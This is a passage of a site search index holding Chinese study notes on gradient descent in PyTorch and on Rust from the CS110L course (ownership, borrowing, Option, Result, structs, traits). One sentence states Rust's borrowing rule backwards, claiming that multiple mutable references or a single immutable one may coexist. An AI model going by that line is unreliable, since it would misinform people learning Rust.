<p>\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u4ee5\u6bd4\u8f83\u7b80\u5355\u5730\u63a8\u5e7f\u5230\u591a\u7ef4\u7684\u60c5\u51b5\uff0c\u5c31\u662f\u5bf9\u5404\u4e2a\u7ef4\u5ea6\u90fd\u6c42\u4e00\u4e2a\u504f\u5bfc\uff0c\u5f62\u6210\u4e00\u4e2a\u5411\u91cf\u7684\u65b9\u5411\uff0c\u4e5f\u5c31\u662f\u4f60\u9700\u8981\u68af\u5ea6\u4e0b\u964d\u7684\u5730\u65b9</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/#2","title":"2. \u68af\u5ea6\u4e0b\u964d","text":"<p>\u5728\u505a\u7ebf\u6027\u56de\u5f52\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u6700\u91cd\u8981\u7684\u6b65\u9aa4\u5c31\u662f\u627e\u5230Loss Function\u4ee5\u53ca\u8fdb\u884c\u4f18\u5316\uff0c\u5728\u8fd9\u91cc\u5c31\u662f\u68af\u5ea6\u4e0b\u964d\uff0c\u800c\u5728\u4e00\u5f00\u59cb\u7684\u4ee3\u7801\u4e2d\uff0c\u8fd9\u4e24\u6b65\u90fd\u88ab\u5c01\u88c5\u5728\u4e00\u4e2a<code>fit</code>\u200b\u51fd\u6570\u91cc\u9762</p> <pre><code>import torch.optim as optim\n\nlearning_rate = 0.1\nmodel = Linear()\noptimizer = optim.SGD(model.parameters(), lr = learning_rate)\n\nfor t in range(200):\n    y_pred = model(x)\n    loss = (y - y_pred).pow(2).mean() #\u5b9a\u4e49\u635f\u5931\n    optimizer.zero_grad() #\u6e05\u7a7a\u4e0a\u4e00\u6b65\u7684\u68af\u5ea6\n    loss.backward()       #\u8ba1\u7b97\u68af\u5ea6\n    optimizer.step()      #\u66f4\u65b0\u53c2\u6570\n    print(model.string()) #\u6253\u5370\u51fa\u6bcf\u4e00\u6b65\uff0c\u7136\u540e\u770b\u770b\u53c2\u6570\u53d8\u5316\n</code></pre> <p>\u76f8\u5bf9\u6765\u8bf4\u68af\u5ea6\u4e0b\u964d\u7684\u7b80\u5355\u5b9e\u73b0\u8fd8\u662f\u6bd4\u8f83\u6e05\u6670\u7684\uff0c\u4f46\u662f\u95ee\u9898\u5728\u4e8e\uff0c\u68af\u5ea6\u4e0b\u964d\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u9047\u5230\u4e0d\u5c11\u95ee\u9898\uff0c\u6bd4\u5982</p> <ul> <li>\u65e0\u6cd5\u4fdd\u8bc1\u6700\u4f4e\u70b9\uff0c\u4f1a\u9047\u5230\u6548\u679c\u4e0d\u597d\u7684\u6781\u503c\u70b9</li> <li>\u8ba1\u7b97\u91cf\u6bd4\u8f83\u5927\uff0c\u56e0\u4e3a\u9700\u8981\u5904\u7406\u6bcf\u4e00\u4e2a\u70b9</li> </ul> <p>\u4f7f\u7528\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5\u53ef\u4ee5\u6bd4\u8f83\u597d\u5730\u89e3\u51b3\u8fd9\u4e24\u4e2a\u95ee\u9898\uff0c\u628a\u6570\u636e\u62c6\u5206\u6210\u4e00\u5806\u7684batch\uff0c\u7136\u540e\u8fdb\u884c\u76f8\u5e94\u7684\u8ba1\u7b97\u4ee5\u53ca\u68af\u5ea6\u4e0b\u964d</p> <pre><code># \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\n\nlearning_rate = 0.1\nbatch_size = 20\nmodel = Linear()\noptimizer = optim.SGD(model.parameters(), lr = learning_rate)\n\nfor t in range(200):\n    ix = (t * batch_size) % len(x)\n    xx = x[ix: ix + batch_size]\n    yy = y[ix: ix + batch_size]\n    yy_pred = model(xx)\n    loss = (yy - yy_pred).pow(2).mean() #\u5b9a\u4e49\u635f\u5931\n    optimizer.zero_grad() #\u6e05\u7a7a\u4e0a\u4e00\u6b65\u7684\u68af\u5ea6\n    loss.backward()       #\u8ba1\u7b97\u68af\u5ea6\n    optimizer.step()      #\u66f4\u65b0\u53c2\u6570\n    print(model.string()) #\u6253\u5370\u51fa\u6bcf\u4e00\u6b65\uff0c\u7136\u540e\u770b\u770b\u53c2\u6570\u53d8\u5316\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/","title":"CS110L","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#1-introduction","title":"1. Introduction","text":"<p>\u8fd9\u4e00\u8282\u4e3b\u8981\u8bb2\u8ff0\u4e86\u6211\u4eec\u4e3a\u4ec0\u4e48\u60f3\u8981\u5b66\u4e60Rust\u4f5c\u4e3a\u6211\u4eec\u7684\u7cfb\u7edf\u7f16\u7a0b\u8bed\u8a00\u3002</p> <p>1.1 For C/C++</p> <p>\u9996\u5148\u662f\u5bf9\u4e8eC/C++\uff0c\u76f8\u6bd4\u4e8e\u8001\u751f\u5e38\u8c08\u7684\u5185\u5b58\u7ba1\u7406\u95ee\u9898\uff0c\u8fd9\u4e00\u8282\u4e2d\u8001\u5e08\u4e3b\u8bb2\u4e86buffer overflow\u95ee\u9898\uff0c\u4e00\u5982\u6211\u4eec\u5728CS161\u4e2d\u5b66\u4e60\u7684\u90a3\u6837\u3002C/C++\u4e2d\u6ca1\u6709\u5bf9\u4e8e\u539f\u751f\u6570\u7ec4\u7684\u8fb9\u754c\u68c0\u67e5\uff0c\u5728\u4e00\u4e9b\u5e93\u51fd\u6570\uff0c\u6bd4\u5982gets\u4e0a\u4e5f\u5e76\u672a\u4f5c\u51fa\u8db3\u591f\u7684\u5b89\u5168\u68c0\u6d4b\u3002\u8fd8\u5b58\u5728\u4e00\u4e9b\u9690\u85cf\u7684\u7c7b\u578b\u8f6c\u6362\u7684\u5751\u70b9\uff0c\u4f8b\u5982\u4e0b\u56fe\u3002</p> <p>\u200b\u200b</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u5bf9\u4e8eC\u7684\u95ee\u9898\uff0c\u4e1a\u754c\u4e5f\u505a\u4e86\u8bb8\u591a\u7684\u52aa\u529b\uff0c\u6bd4\u5982Valgrind\u8fd9\u7c7b\u5185\u5b58\u68c0\u6d4b\u5de5\u5177\uff0c\u4f46\u5176\u7f3a\u9677\u5728\u4e8e\uff0c\u8fd9\u7c7b\u5de5\u5177\u4ec5\u5f53\u9519\u8bef\u53d1\u751f\u7684\u65f6\u5019\u80fd\u591f\u6709\u6548\u68c0\u6d4b\uff0c\u800c\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5e76\u65e0\u6cd5\u9884\u6599\u5230\u4f1a\u6709\u54ea\u4e9b\u9519\u8bef\u7684\u8f93\u5165\u3002</p> <p>1.2 For GC language</p> <p>\u5bf9\u4e8eGC\u8bed\u8a00\u6765\u8bf4\uff0c\u7cfb\u7edf\u7f16\u7a0b\u7684\u96be\u70b9\u5728\u4e8eGC\u7684\u6548\u7387\u4ee5\u53ca\u5bf9\u4e8e\u5185\u5b58\u7684\u4e0d\u53ef\u63a7\u5236\u6027\uff0c\u8b6c\u5982\u6211\u4eec\u9694\u4e00\u6bb5\u65f6\u95f4\u5c31\u8981\u6253\u65ad\u8fd0\u884c\u6765\u68c0\u6d4bmemory \u72b6\u6001\uff1b\u518d\u6bd4\u5982\u8bf4\u6211\u60f3\u8981\u89c2\u6d4b\u5185\u5b58\u72b6\u6001\u6765\u63d0\u9ad8cache\u547d\u4e2d\u7387\uff0c\u8fd9\u5bf9\u4e8eGC\u6765\u8bf4\u90fd\u662f\u96be\u4ee5\u505a\u5230\u7684\u3002\u3002</p> <p>\u5e76\u4e14\u5373\u4fbf\u662f\u4f7f\u7528\u4e86GC\uff0c\u4e5f\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u6211\u4eec\u5728\u5185\u5b58\u7ba1\u7406\u4e0a\u7edd\u4e0d\u51fa\u9519</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#2-memory-safety","title":"2. Memory Safety","text":"<p>memory problem\u6709\u591a\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7531\u6307\u9488\u5e26\u6765\u7684\u4e0d\u786e\u5b9a\u6027\u5f62\u6210\u7684\u95ee\u9898\u53ef\u8c13\u5343\u5947\u767e\u602a\uff0c\u9664\u4e86\u7ecf\u5178\u7684Memory leak\u4ee5\u5916\u8fd8\u6709\u8bb8\u591a\uff0c\u4f8b\u5982</p> <p>Example1 iterator invaildation</p> <p>\u200b\u200b</p> <p>\u7531\u4e8evector\u7684resize\u5bfc\u81f4\u7684\u6307\u9488\u5931\u6548\u95ee\u9898</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#21-language-and-the-compiler","title":"2.1 language and the compiler","text":"<p>\u7f16\u8bd1\u9636\u6bb5\uff0c\u6211\u4eec\u4f1a\u5bf9\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4ee3\u7801\u8fdb\u884c\u8db3\u591f\u591a\u7684\u5206\u6790\uff0c\u8fd9\u4e9b\u4fe1\u606f\u6216\u8bb8\u53ef\u4ee5\u7528\u5728\u5bf9\u4e8e\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u68c0\u67e5\u4e0a\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5b58\u5728\u4e00\u79cd\u7b97\u6cd5\uff0c\u80fd\u591f\u5728\u7f16\u8bd1\u9636\u6bb5\u5c31\u627e\u5230\u8fd9\u4e2a\u7a0b\u5e8f\u6240\u6709\u53ef\u80fd\u7684\u9519\u8bef\uff0c\u90a3\u7b80\u76f4\u592a\u5b8c\u7f8e\u4e86\uff0c\u53ef\u60dc\u7684\u662f\uff0c\u8fd9\u6837\u7684\u505a\u6cd5\u96be\u5ea6\u8d77\u7801\u5728\u505c\u673a\u95ee\u9898\u4e4b\u4e0a\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u9650\u5236\uff0c\u6765\u4f7f\u5f97\u7a0b\u5e8f\u66f4\u4e0d\u592a\u53ef\u80fd\u51fa\u9519\u3002</p> <p>\u6211\u4eec\u8fd8\u662f\u56de\u5230\u4e0a\u8ff0\u7684iterator invaildation\u7684\u4f8b\u5b50</p> <p>\u200b\u200b</p> <p>\u6709\u4e00\u4e2a\u4e0d\u9519\u7684\u60f3\u6cd5\u662f\uff0c\u5982\u679c\u6211\u4fdd\u5b58\u4e86\u4e00\u4e2a\u5bf9\u4e8evec\u7684\u5f15\u7528/\u6307\u9488\uff0c\u6211\u4eec\u5c31\u4e0d\u80fd\u5bf9\u4e8e\u5176\u518d\u505a\u4fee\u6539</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#22-rusts-ownership","title":"2.2 Rust's ownership","text":"<p>Rust\u7684\u6240\u6709\u6743\u673a\u5236\uff0c\u662f\u6765\u89e3\u51b3\u4e0a\u8ff0\u7684\u95ee\u9898\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u4e0d\u8bba\u662f\u4f20\u9012\u53c2\u6570\u7ed9\u51fd\u6570\uff0c\u8fd8\u662f\u7b80\u5355\u7684\u201c\u8d4b\u503c\u201d\uff0c\u90fd\u4f1a\u5bfc\u81f4\u6240\u6709\u6743\u7684\u8f6c\u79fb</p> <p>Rust\u7684\u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e0d\u4ec5\u4f1a\u505a\u5f15\u7528\u6570\u91cf\u548c\u53ef\u53d8\u7684\u68c0\u67e5\uff0c\u8fd8\u4f1a\u505a\u751f\u547d\u5468\u671f\u7684\u68c0\u67e5\uff0c\u4f8b\u5982\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u7f16\u8bd1\u5668\u53ef\u4ee5\u5bdf\u89c9\u51fa\u4f60\u5728\u628a\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e0d\u591f\u957f\u7684\u5f15\u7528\u653e\u5230\u5916\u9762</p> <pre><code>fn dedup(v: &amp;mut Vec&lt;i32&gt;) {\n    //unimplemented!()\n    let mut temp_set :HashSet&lt;i32&gt;= HashSet::new();\n    let mut target_vec: Vec&lt;i32&gt; = Vec::new();\n    for i in 0..v.len(){\n        if !temp_set.contains(&amp;v[i]){\n            temp_set.insert(v[i]);\n            target_vec.push(v[i]);\n        }\n    }\n    let t = &amp;mut target_vec;\n    v = t; \u62a5\u9519\n    //mem::swap(v, &amp;mut target_vec);\n}\n</code></pre> <p>\u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528</p> <p>\u6b63\u5982\u6211\u5728Rust\u5165\u95e8\u4e2d\u5199\u7684\uff0c\u53ea\u80fd\u5b58\u5728\u591a\u4e2a\u53ef\u53d8\u5f15\u7528\u6216\u8005\u5355\u4e2a\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u770b</p> <pre><code>fn main() {\n    let mut s = String::from(\"hello\");\n    let s1 = &amp;mut s;\n    println!(\"{}, {}\",s, s1);\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u770b\u4e0a\u53bb\u5b8c\u5168\u6ca1\u95ee\u9898\uff0c\u4f46\u5b9e\u9645\u4e0a\u4f1a\u62a5\u9519</p> <pre><code> --&gt; src/main.rs:4:23\n  |\n3 |     let s1 = &amp;mut s;\n  |              ------ mutable borrow occurs here\n4 |     println!(\"{}, {}\",s, s1);\n  |                       ^  -- mutable borrow later used here\n  |                       |\n  |                       immutable borrow occurs here\n</code></pre> <p>\u7f16\u8bd1\u5668\u8bf4\uff0c\u5bf9\u4e8eprintln\u8fd9\u4e2a\u5b8f\u6765\u8bf4\uff0cs\u662f\u4e0d\u53ef\u53d8\u5f15\u7528\uff0cs1\u662f\u53ef\u53d8\u5f15\u7528\uff0c\u5373\u4fbf\u662f\u5728\u53c2\u6570\u4e0a\u9762\uff0c\u6211\u4eec\u4e5f\u65e0\u6cd5\u505a\u5230\u540c\u65f6\u4f20\u5165\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u3002\u6211\u4eec\u8981\u6ce8\u610f\uff0c\u4efb\u4f55\u4e00\u6b21\u4f20\u53c2\u76f8\u5f53\u4e8e\u4ea7\u751f\u4e86\u4e00\u4e2a\u5f15\u7528\uff0c \u90a3\u4e48\u6211\u4eec\u4f1a\u8003\u8651\u8f6c\u53d8\u4e00\u4e0b\uff0c\u628a\u4e24\u8005\u5206\u5f00\u6765\u8f93\u51fa</p> <pre><code>fn main() {\n    let mut s = String::from(\"hello\");\n    let s1 = &amp;mut s;\n    println!(\"{}\", s);\n    println!(\"{}\", s1);\n}\n</code></pre> <p>\u8fd9\u4f9d\u65e7\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u4f1a\u53d1\u73b0\u6211\u4eec\u8fd9\u91cc\u6709\u4e00\u4e2a\u53ef\u53d8\u548c\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5f15\u7528\u3002\u4f46\u662f\u5982\u679c\u628as1\u548cs\u66ff\u6362\u4e00\u4e0b\u4f4d\u7f6e\u5c31\u6ca1\u95ee\u9898\u4e86\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u8ba4\u8bc6\u5230s1\u5df2\u7ecf\u5728\u5176\u751f\u547d\u5468\u671f\u7684\u7684\u6700\u540e\u4e86</p> <p>\u5728\u51fd\u6570\u7684\u8fd4\u56de\u503c\u8fc7\u7a0b\u4e2d\uff0c\u8fd4\u56de\u503c\u7684\u6240\u6709\u6743\u4f1a\u8f6c\u79fb\u5230\u8c03\u7528\u8005\u5904</p> <p>\u81ea\u52a8\u89e3\u5f15\u7528</p> <p>\u5728C++\u4e2d\uff0c\u5f15\u7528\u7684\u5b58\u5728\u5f80\u5f80\u662f\u56e0\u4e3a\u6307\u9488\u9700\u8981\u624b\u52a8\u89e3\u5f15\u7528\uff0c\u4ece\u800c\u4f1a\u8ba9\u4ee3\u7801\u663e\u5f97\u5f88\u96be\u770b\u7684\u8bed\u6cd5\u7cd6\uff0c\u800cRust\u4f1a\u4f7f\u7528\u81ea\u52a8\u89e3\u5f15\u7528\uff0c\u4f7f\u5f97\u6307\u9488\u8868\u73b0\u7684\u539f\u59cb\u7684\u5bf9\u8c61\u4e00\u6837</p> <pre><code>p1.distance(&amp;p2);\n(&amp;p1).distance(&amp;p2);\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#23-option","title":"2.3 Option","text":"<p>Option\u662fRust\u7684\u4e00\u4e2a\u673a\u5236\u7528\u4e8e\u66ff\u4ee3\u7a7a\u6307\u9488\u7684\u4f7f\u7528\u3002</p> <p>\u200b\u200b</p> <pre><code>if !feeling_lucky().is_none(){\n    println!(\"is lucky\");\n}\n</code></pre> <p>\u5f53\u6211\u4eec\u9700\u8981\u83b7\u53d6Option\u4e2d\u7684\u503c\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u83b7\u53d6\u8c03\u7528<code>unwrap_or</code>\u200b\uff0c\u5982\u679c\u662fNone\u5c31\u8fd4\u56de\u53c2\u6570\u90a3\u4e2a</p> <pre><code>let message = feeling_lucky().unwrap_or(String::from(\"not lucky\"));\n</code></pre> <p>\u6211\u4eec\u901a\u5e38\u9f13\u52b1\u4f7f\u7528<code>match</code>\u200b\u6765\u5339\u914dOption</p> <pre><code>match feeling_lucky() {\n    Some(message) =&gt; {\n        println!(\"Got message: {}\", message);\n    },\n    None =&gt; {\n        println!(\"No message returned :-/\");\n    },\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#24-error-handling","title":"2.4 Error handling","text":"<p>\u4f20\u7edf\u7684C\u5728\u9519\u8bef\u6355\u83b7\u65b9\u9762\u57fa\u672c\u5b8c\u5168\u7a0b\u5e8f\u5458\u4e4b\u95f4\u7684\u7ea6\u5b9a\u4fd7\u79f0\uff0c\u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u76f8\u5f53\u7cdf\u7cd5\u7684\u505a\u6cd5\u3002\u800cRust\u4e5f\u6ca1\u6709\u4f7f\u7528Cpp\u548cJava\u7b49\u4e3b\u6d41\u8bed\u8a00\u7684\u5f02\u5e38\u6355\u83b7\u673a\u5236\u3002</p> <p>\u5982\u679c\u53d1\u751f\u4e86\u4e0d\u53ef\u6062\u590d\u7684\u9519\u8bef\uff0cRust\u4f1a\u4f7f\u7528<code>panic!</code>\u200b\u5b8f\uff0c\u6765\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83</p> <pre><code>if sad_times() {\n  panic!(\"Sad times!\");\n}\n</code></pre> <p>\u5982\u679c\u53d1\u751f\u7684\u9519\u8bef\u53ef\u4ee5\u6062\u590d\uff0c\u6211\u4eec\u9700\u8981\u8fd4\u56de\u4e00\u4e2a <code>Result&lt;T, E&gt;</code>\u200b, \u5176\u8868\u793a\u6211\u4eec\u8fd4\u56de <code>Ok(value of type T)</code>\u200b or <code>Err(value of type E)</code>\u200b.</p> <p>\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>unwrap()</code>\u200b\u548c<code>expect()</code>\u200b\u6765\u68c0\u67e5Result</p> <pre><code>// Panic if the baby cries:\nlet ok_message = poke_toddler().unwrap();\n// Same thing, but print a more descriptive panic message:\nlet ok_message = poke_toddler().expect(\"Toddler cried :(\");\n</code></pre> <p>Rust\u4f7f\u7528<code>?</code>\u200b\u5173\u952e\u8bcd\uff0c\u6765\u505a\u7c7b\u4f3c\u4e8e\u629b\u51fa\u5f02\u5e38\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u5728match\u4e00\u4e2a\u53ef\u80fd\u4f1a\u629b\u51fa\u5f02\u5e38\u7684\u4e1c\u897f\u7684\u65f6\u5019\uff0c\u4f1a\u4f7f\u7528<code>?</code>\u200b\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u6211\u4eec\u9700\u8981\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4f46\u662f<code>?</code>\u200b\u5173\u952e\u8bcd\u7684\u4f7f\u7528\u662f\u6709\u5c40\u9650\u7684\uff0c\u5b83\u53ea\u80fd\u5728\u8fd4\u56de\u503c\u4e3aResult/Option\u7684\u51fd\u6570\u4e2d\u4f7f\u7528</p> <pre><code>let file = File::open(filename)?;\n</code></pre> <p>\u76f8\u5f53\u4e8e</p> <pre><code>let file = match File::open(filename) {\n    Ok(file) =&gt; file,\n    Err(err) =&gt; return Err(err),\n};\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#3-oop-in-rust","title":"3. OOP in Rust","text":"<p>Rust\u4e2d\u540c\u6837\u5b58\u5728\u7ed3\u6784\u4f53\uff0c\u53ef\u4ee5\u4e3a\u6211\u4eec\u63d0\u4f9b\u9762\u5411\u5bf9\u8c61\u7684\u529f\u80fd\uff0c\u4f46\u662fRust\u7684\u7ed3\u6784\u4f53\u589e\u52a0\u4e86\u66f4\u591a\u7684\u9650\u5236\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#31","title":"3.1 \u52a8\u6001\u5185\u5b58\u5206\u914d","text":"<p>\u6211\u4eec\u5728\u4e4b\u524d\u7684\u5185\u5bb9\u4e2d\u4e00\u76f4\u5728\u8bb2\u6307\u9488\uff0c\u5374\u59cb\u7ec8\u6ca1\u6709\u6b63\u9762\u8bb2\u8ff0\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u6982\u5ff5\uff0c\u5bf9\u4e8eRust\u800c\u8a00\uff0c\u5b83\u53ea\u6709\u201c\u667a\u80fd\u6307\u9488\u201d\uff0c\u6307\u9488\u88ab\u5c01\u88c5\u4e3a\u4e00\u4e2a\u7c7b\uff0c\u5176\u81ea\u52a8\u8c03\u7528drop\u51fd\u6570\u5728\u751f\u547d\u5468\u671f\u7ed3\u675f\u4e4b\u65f6</p> <pre><code>let x:Box&lt;u32&gt; = Box::new(10);\n</code></pre> <p>Option\u548cBox\u7c7b\u4f3c\uff0c\u4e5f\u662f\u4e00\u79cd\u6307\u9488\uff0c\u5728Rust\u4e2d\uff0c\u6307\u9488\u53ef\u4ee5\u901a\u8fc7take\u8f6c\u79fb\u6240\u6709\u6743\uff0c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#32-oop","title":"3.2 OOP \u4ee5\u94fe\u8868\u4e3a\u4f8b","text":"<p>\u6709\u53ef\u80fd\u4e3aNone\u7684\u503c\u90fd\u9700\u8981\u7528Option\u6765\u5305\u88f9\uff0cBox\u8868\u793a\u5176\u662f\u4e00\u4e2aUnique\u6307\u9488\uff0c\u53ef\u4ee5\u901a\u8fc7\u52a8\u6001\u5185\u5b58\u5206\u914d</p> <pre><code>struct node{\n    value: u32,\n    next: Option&lt;Box&lt;node&gt;&gt;\n}\nstruct linkedlist{\n    head: Option&lt;Box&lt;node&gt;&gt;,\n    size: usize\n}\n</code></pre> <p>\u4e0a\u9762\u7684struct\u662f\u4e00\u4e2a\u66f4\u7c7b\u4f3c\u63a5\u53e3\u7684\u5b58\u5728\uff0c\u9700\u8981impl\u4e4b\u540e\u624d\u80fd\u6b63\u5e38\u4f7f\u7528</p> <pre><code>impl node {\n    pub fn new(value:u32, next:Option&lt;Box&lt;node&gt;&gt;) -&gt; node {\n        node{value:value, next:next}\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684new\u5173\u952e\u8bcd\uff0c\u662f\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5f53\u6211\u4eec\u771f\u6b63\u8981\u5b9e\u4f8b\u5316\u8fd9\u4e48\u4e00\u4e2anode\u7684\u65f6\u5019</p> <pre><code>let new_node:Option&lt;Box&lt;node&gt;&gt; = Some(Box::new(node::new(value, self.head.take())));\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u8c03\u7528take()\uff0c\u663e\u793a\u5730\u83b7\u53d6\u6240\u6709\u6743\uff0cRust\u4e0d\u5141\u8bb8\u6709\u4e24\u4e2a\u53d8\u91cf\u62e5\u6709\u76f8\u540c\u7684\u6240\u6709\u6743\uff0c\u56e0\u6b64\u9700\u8981take()\u6765\u8f6c\u79fb\u6240\u6709\u6743\uff1b\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5b9e\u73b0copy\u65b9\u6cd5\uff0c\u4f7f\u5f97\u5176\u5b8c\u6210\u8d44\u6e90\u62f7\u8d1d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#33-or","title":"3.3 \u62f7\u8d1d\u6784\u9020 or \u79fb\u52a8\u6784\u9020","text":"<pre><code>  let user2 = User {\n        email: String::from(\"another@example.com\"),\n        ..user1\n    };\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u7528user1\u7684\u5185\u5bb9\u6765\u6784\u9020user2\uff0c\u540c\u65f6\u66f4\u7075\u6d3b\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u503c\u4e0d\u4f7f\u7528user1\u7684\uff0c\u800c\u662f\u7ed9\u5b83\u989d\u5916\u7684\u53c2\u6570\uff0c\u4f8b\u5982\u8fd9\u91cc\u7684<code>email</code>\u200b\u5b57\u6bb5</p> <p>\u4f46\u662f\u7531\u4e8eRust\u7684\u7279\u6b8a\u6027\uff0c\u5982\u679cuser1\u4e2d\u5b58\u5728\u4e00\u4e9b\u672a\u5b9e\u73b0Copy\u65b9\u6cd5\u7684\u5b57\u6bb5\uff0c\u5728\u672c\u6b21\u6784\u9020\u4e4b\u540euser1\u4f1a\u5931\u53bb\u5bf9\u8fd9\u4e9b\u5b57\u6bb5\u7684\u6240\u6709\u6743\u3002\u56e0\u6b64Rust\u8fd9\u79cd\u539f\u751f\u6784\u9020\u66f4\u63a5\u8fd1\u4e8eC++\u4e2d\u7684\u79fb\u52a8\u6784\u9020\u51fd\u6570</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#4-traits-and-generics","title":"4. Traits and generics","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#41-traits","title":"4.1 traits","text":"<p>traits\uff0c\u4e00\u822c\u7406\u89e3\u4e3a\u7279\u5f81\uff0c\u662f\u4e00\u79cd\u516c\u6709\u529f\u80fd\uff0c\u4f8b\u5982Add\uff0cDisplay\u7b49\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u6211\u4eec\u81ea\u5df1\u7684\u7c7b\u53bb\u5b9e\u73b0\u8fd9\u4e9btraits\uff0c\u5e76\u4e14\u53ef\u4ee5\u6839\u636etraits\u53bb\u68c0\u67e5\u8fd9\u4e9b\u7c7b\u662f\u5426\u6ee1\u8db3\u6761\u4ef6</p> <p>\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49traits\uff0c\u57fa\u7840\u7684\u8bed\u6cd5\u5982\u4e0b\uff0c\u6240\u8c13\u7684traits\u53ea\u5b9a\u4e49\u51fd\u6570\u58f0\u660e\u957f\u4ec0\u4e48\u6837\u5b50</p> <pre><code>pub trait Summary {\n    fn summarize(&amp;self) -&gt; String;\n}\npub struct Post {\n    pub title: String, // \u6807\u9898\n    pub author: String, // \u4f5c\u8005\n    pub content: String, // \u5185\u5bb9\n}\n\nimpl Summary for Post {\n    fn summarize(&amp;self) -&gt; String {\n        format!(\"\u6587\u7ae0{}, \u4f5c\u8005\u662f{}\", self.title, self.author)\n    }\n}\n\npub struct Weibo {\n    pub username: String,\n    pub content: String\n}\n\nimpl Summary for Weibo {\n    fn summarize(&amp;self) -&gt; String {\n        format!(\"{}\u53d1\u8868\u4e86\u5fae\u535a{}\", self.username, self.content)\n    }\n}\n</code></pre> <p>traits\u5b9e\u73b0\u7684\u9650\u5236</p> <p>\u5173\u4e8e\u7279\u5f81\u5b9e\u73b0\u4e0e\u5b9a\u4e49\u7684\u4f4d\u7f6e\uff0c\u6709\u4e00\u6761\u975e\u5e38\u91cd\u8981\u7684\u539f\u5219\uff1a\u5982\u679c\u4f60\u60f3\u8981\u4e3a\u7c7b\u578b <code>A</code>\u200b \u5b9e\u73b0\u7279\u5f81 <code>T</code>\u200b \uff0c\u90a3\u4e48 <code>A</code>\u200b 